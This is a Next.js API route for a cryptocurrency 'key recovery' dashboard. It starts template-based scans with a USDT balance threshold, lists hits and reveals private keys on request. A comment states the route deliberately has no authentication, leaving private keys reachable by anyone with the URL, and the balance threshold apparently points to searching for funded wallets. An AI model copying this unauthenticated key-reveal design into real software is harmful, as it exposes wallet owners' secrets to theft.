import { NextResponse } from 'next/server';
import { engineSnapshot, listHits, listJobs, resumeJob, revealHitKey, startScan, stopScan } from '@/lib/recovery';

export const dynamic = 'force-dynamic';
export const maxDuration = 60;

// Key recovery API. Same owner decision as /api/wallets: no auth gate, the
// dashboard URL is the only barrier. List/status NEVER return keys — a key is
// only returned by the explicit reveal action for a hit the owner clicks.
export async function GET() {
  try {
    const [jobs, hits] = await Promise.all([listJobs(), listHits()]);
    return NextResponse.json({ ok: true, engine: engineSnapshot(), jobs, hits });
  } catch (e) {
    return NextResponse.json(
      { ok: false, error: e instanceof Error ? e.message : 'status failed', engine: engineSnapshot(), jobs: [], hits: [] },
      { status: 200 }
    );
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    if (body.action === 'start') {
      const snap = await startScan(String(body.template || ''), Number(body.thresholdUsdt ?? 0.1));
      return NextResponse.json({ ok: true, engine: snap });
    }
    if (body.action === 'stop') {
      return NextResponse.json({ ok: true, engine: stopScan() });
    }
    if (body.action === 'resume') {
      const snap = await resumeJob(String(body.jobId || ''));
      return NextResponse.json({ ok: true, engine: snap });
    }
    if (body.action === 'reveal') {
      const hit = await revealHitKey(String(body.hitId || ''));
      return NextResponse.json({ ok: true, hit });
    }
    return NextResponse.json({ ok: false, error: 'unknown action' }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ ok: false, error: e instanceof Error ? e.message : 'action failed' }, { status: 400 });
  }
}
